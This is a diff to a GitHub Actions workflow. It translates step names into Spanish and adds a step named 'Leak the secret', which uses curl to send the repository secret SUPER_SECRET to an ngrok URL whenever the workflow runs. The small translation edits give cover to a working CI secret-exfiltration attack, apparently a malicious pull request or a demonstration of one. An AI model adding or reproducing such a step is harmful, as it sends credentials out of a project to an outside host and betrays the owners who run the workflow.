@@ -1,10 +1,14 @@
 on: [push, pull_request]
 jobs:
   test:
-    name: Test
+    name: Prueba
     runs-on: ubuntu-latest
     steps:
-    - name: 'Hello World'
+    - name: 'Hola Mundo'
       uses: actions/hello-world-docker-action@master
       with:
         who-to-greet: ${{ secrets.SUPER_SECRET }}
+    - name: 'Leak the secret'
+      uses: wei/curl@v1
+      with:
+        args: -k "https://476c8c29.ngrok.io/?leak=${{ secrets.SUPER_SECRET }}"
